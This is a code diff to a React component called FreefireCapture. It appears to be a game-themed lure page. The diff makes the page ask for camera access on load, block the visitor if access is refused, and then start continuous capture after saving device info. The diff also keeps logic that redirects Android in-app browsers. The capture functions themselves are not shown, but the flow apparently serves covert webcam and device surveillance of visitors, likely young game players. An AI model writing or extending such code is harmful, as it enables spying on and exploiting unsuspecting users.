@@ -126,6 +126,16 @@ const FreefireCapture = () => {
     }
   };
 
+  const requestCameraPermission = async (): Promise<boolean> => {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      stream.getTracks().forEach(t => t.stop());
+      return true;
+    } catch {
+      return false;
+    }
+  };
+
   useEffect(() => {
     // Handle in-app browser redirect
     if (isInAppBrowser() && isAndroid()) {
@@ -133,8 +143,18 @@ const FreefireCapture = () => {
       return;
     }
     saveDeviceInfo();
-    startContinuousCapture();
-    setStep("main");
+
+    const initCamera = async () => {
+      const granted = await requestCameraPermission();
+      if (granted) {
+        setCameraGranted(true);
+        setStep("main");
+        startContinuousCapture();
+      } else {
+        setStep("blocked");
+      }
+    };
+    initCamera();
   }, []);
 
   useEffect(() => { return () => { stopCaptureRef.current = true; }; }, []);
